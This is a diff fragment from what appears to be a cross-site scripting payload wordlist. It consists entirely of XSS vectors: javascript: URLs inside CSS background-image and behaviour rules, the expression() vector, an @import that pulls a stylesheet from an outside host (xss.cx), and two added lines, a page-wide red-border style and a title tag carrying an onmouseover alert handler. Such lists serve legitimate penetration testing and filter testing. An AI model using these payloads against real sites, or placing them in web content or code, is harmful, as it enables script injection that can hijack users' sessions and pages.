@@ -18,4 +18,6 @@ behaviour:url\0028javascript:confirm\0028[0][0]\0029\0029
 <STYLE>.XSS{background-image:url("javascript:confirm(document.location)");}</STYLE><A CLASS=XSS></A>
 <STYLE>@import'http://xss.cx/xss.css';</STYLE>
 <XSS STYLE="xss:expression(confirm(document.location))">
+<style>*{display:table; border:10px solid red;}</style>
+<title onmouseover="alert(1)">hover me</title>
 /* RFI END */
